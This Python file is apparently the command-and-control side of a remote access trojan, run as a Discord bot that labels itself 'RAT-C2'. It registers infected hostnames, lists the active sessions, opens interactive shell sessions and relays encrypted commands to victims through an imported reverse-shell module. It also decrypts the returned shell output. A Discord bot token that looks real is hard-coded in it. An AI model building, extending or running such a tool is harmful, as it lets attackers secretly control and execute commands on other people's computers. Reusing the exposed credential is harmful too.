import discord
from discord.ext import commands
import requests
from linuxshell import *

TOKEN = 'MTM4Nzc2MTAyNTQ0NDc0NTMyNw.Gw0Efj.gT5ntY7rGfascLfhLwhU7Kk-kVM1-bY1Ndww8U'

GENERAL = 1387935717673537577

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
sessions = {}
current_session = {"hostname": None, "channel_id": None}

@bot.event
async def on_ready():
    channel = bot.get_channel(GENERAL)
    print(f"[+] RAT-C2 listo como {bot.user}")
    if channel:
        await channel.send(f"RAT-C2 conectado...")
        await channel.send("command: !ayuda")
    else:
        print("Error en la conexión con el servidor")

@bot.event
async def on_message(message):

    if "REGISTER" in message.content:
        parts = message.content.split()
        if len(parts) == 3:
            _, hostname, canal_id = parts
            sessions[hostname] = int(canal_id)
            print(sessions)
            await message.channel.send(f"- {hostname} registrado")

    elif "PKTL" in message.content:
        revshell_encrypt = message.content.strip("PKTL:")
        revshell = Revshell_HTTPS_Recv(revshell_encrypt).pkt_decry.decode()
        await message.channel.send(revshell)

    elif message.author == bot.user:
        return
    await bot.process_commands(message)

    # Modo interactivo (estás dentro de una sesión)
"""   if current_session["hostname"] and message.channel.id == GENERAL:
        if message.content.strip().lower() == "exit":
            await message.channel.send(" Cerrando sesión interactiva...")
            current_session["hostname"] = None
            current_session["channel_id"] = None
        else:
            canal_obj = bot.get_channel(current_session["channel_id"])
            if canal_obj:
                await canal_obj.send(f"run: {message.content}")
            else:
                await message.channel.send("X Canal no encontrado.")
        return"""

#await bot.process_commands(message)

@bot.command()
async def ayuda(ctx):
    await ctx.send("!sessions_active\n!kill <hostname>\n!cmd <hostname> <comando>\n!broadcast <comando>")

@bot.command()
async def sessions_active(ctx):
    if not sessions:
        await ctx.send("X No hay sesiones activas.")
    else:
        reply = "\n".join([f"- {k} → canal {v}" for k, v in sessions.items()])
        await ctx.send(f" Sesiones activas:\n{reply}")

@bot.command()
async def shell(ctx, hostname: str):
    if hostname in sessions:
        current_session["hostname"] = hostname
        current_session["channel_id"] = sessions[hostname]

        await ctx.send(f"[+] Session active: {hostname}")

    else:
        await ctx.send(f"X Hostname '{hostname}' no registrado")

@bot.command()
async def xrun(ctx, *, args):
    comando = Revshell_HTTPS_SEND(args)
    comando_encriptado = comando.pkt_send().replace("PKTL", "EXEL")
    await ctx.send(comando_encriptado)


bot.run(TOKEN)
